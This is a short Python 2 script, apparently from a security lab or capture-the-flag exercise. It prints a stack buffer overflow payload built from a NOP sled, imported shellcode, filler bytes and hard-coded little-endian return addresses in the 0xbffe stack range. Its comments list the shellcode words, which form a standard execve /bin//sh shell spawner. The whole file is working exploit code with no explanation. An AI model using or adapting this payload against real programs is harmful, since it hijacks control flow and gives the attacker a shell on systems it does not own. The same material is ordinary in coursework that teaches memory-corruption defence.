from shellcode import shellcode
from struct import pack
#print len(shellcode)
#print "\x69"*4+shellcode + "a"*500
print "\x90"*(int(0x408)-len(shellcode)-20)+ shellcode +"\x69"*20 +pack("<I", 0xbffe8118) + pack("<I", 0xbffe7e84)# "\x54"+"\xbb"+"\xfe"+"\xbf"+"\x50"+"\xbb"+"\xfe"+"\xbf"
#shellcode 6*4 =23 bytes
#0x99580b6a	0x2f2f6852	0x2f686873 0x896e6962	0x895352e3	0x6180cde1